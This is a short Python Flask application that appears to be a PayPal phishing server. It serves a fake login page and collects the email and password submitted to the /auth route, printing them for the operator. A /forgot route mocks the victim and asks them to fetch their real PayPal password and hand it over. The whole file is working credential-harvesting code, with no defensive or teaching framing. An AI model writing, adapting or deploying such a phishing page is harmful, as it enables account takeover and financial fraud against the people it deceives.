from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/auth", methods=['POST'])
def auth ():
    dati = {"email": request.form["email"], "password": request.form["pass"]}
    print(dati)
    return render_template("ok.html")

@app.route("/")
def index ():
    return render_template("login.html")

@app.route("/forgot")
def forgot ():
    return "It's not fair, now go to Paypal real login page and get your real password and give it to me"

if __name__ == "__main__":
    app.run(host="0.0.0.0")   

input()
